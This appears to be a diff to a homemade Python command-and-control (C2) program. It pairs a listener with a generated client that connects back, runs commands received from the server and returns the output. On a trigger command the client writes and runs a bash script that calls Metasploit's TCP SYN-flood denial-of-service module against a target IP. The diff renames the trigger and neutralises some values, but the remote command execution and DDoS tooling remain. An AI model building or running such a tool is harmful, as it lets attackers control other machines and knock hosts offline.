@@ -5,9 +5,6 @@ import os
 import psutil
 from threading import Thread
 
-
-
-
 def get_public_ip():
     try:
         from requests import get
@@ -15,7 +12,6 @@ def get_public_ip():
     except ImportError:
         print("requests library not found, please install it by running 'pip install requests'")
         sys.exit(1)
-
 
 
 
@@ -28,10 +24,8 @@ def get_local_ip():
 
 
 
-
 def send_command(client_socket, command):
     client_socket.sendall(command.encode('utf-8'))
-
 
 
 
@@ -46,10 +40,8 @@ def handle_client(client_socket):
         if not command:
             break
 
-
         if command == "exit":
             break
-
 
         send_command_thread = Thread(target=send_command, args=(client_socket, command))
         send_command_thread.start()
@@ -63,30 +55,23 @@ def handle_response(client_socket):
 
         print(response)
 
-
     client_socket.close()
 
-def print_frog_ascii():
+def print_intro():
     print("C2 SERVER")
     print("""
-Created by cd_UAH
 ------------------------------------------------------------
     """)
-
-
-
-
 def main():
-    print_frog_ascii()
+    print_intro()
     print("1. Type 1 to start listening")
     print("2. Type 2 to spawn a client and start listening")
-
 
     choice = input(">> ")
     if choice == "1":
         start_listening()
     elif choice == "2":
-        local_ip = '192.168.100.7' #get_local_ip()
+        local_ip = '127.0.0.1' #get_local_ip() #Manual set local ip if this doesn't work
         if local_ip is None:
             print("Wi-Fi adapter not found. Please make sure it is connected and try again.")
             sys.exit(1)
@@ -120,20 +105,31 @@ except socket.error:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("{local_ip}", 5555))
 
+#trial. could maybe be updated and changed
+#def ddos():
+#    print("Creating BASH script")  # create the DDoS bash script to run metasploit
+#    file = open('execute.sh', 'w')
+#    file.write('#!/bin/bash'
+#               )
+#    file.close()
+#    print("File created as execute.sh")
+#    print("Executing execute.sh to initiate DDoS")
+#    subprocess.call('./execute.sh')
 
-def ddos():
-    print("Creating BASH script")  # create the DDoS bash script to run metasploit
-    file = open('execute.sh', 'w')
-    file.write('#!/bin/bash'
-               )
-    file.close()
-    print("File created as execute.sh")
-    print("Executing execute.sh to initiate DDoS")
+def ddos2():
+    """bashtemp = 
+    #!/bin/bash
+    TARGET
+    echo "Enter IP to DDoS"
+    read TARGET
+    msfconsole -q -x "use auxiliary/dos/tcp/synflood; setRHOST $TARGET; exploit"
+    with open('execute.sh', 'w') as execute_bash:
+        execute_bash.write(bashtemp)
+    print("execute.sh created and ready to run")
     subprocess.call('./execute.sh')
-
-
+    """
 while True:
-    print("Command received from server")  # verify command recieved
+    print("Command received from server")  # verify command received
     command = s.recv(1024).decode('utf-8')
     if not command or command == "exit":
         break
@@ -143,11 +139,11 @@ while True:
         #tarIP = s.recv(1024).decode('utf-8')
         print("Target IP set as:", tarIP, "waiting for execution command")
         f = open('execute.sh', 'a') 
-        f.write('msfconsole -q -x "use auxiliary/dos/tcp/synflood; set RHOST {tarIP}; exploit"')
+        f.write('msfconsole -q -x "use auxiliary/dos/tcp/synflood; set RHOST 0; exploit"')
         f.close()
-    if command == "Order 66":  # execution code
-        print("EXECUTING ORDER 66 STANDBY")
-        ddos()
+    if command == "DDOS_CAI":  # execution code
+        print("EXECUTING DDOS STANDBY")
+        ddos2()
 
     response = execute_command(command)
     s.sendall(response.encode('utf-8'))
@@ -166,7 +162,6 @@ s.close()
 
 
 
-
 def start_listening():
     local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -178,7 +173,6 @@ def start_listening():
     client, addr = local_socket.accept()
     print(f"Connection established with {addr[0]}:{addr[1]}")
     handle_client(client)
-
 
 
 
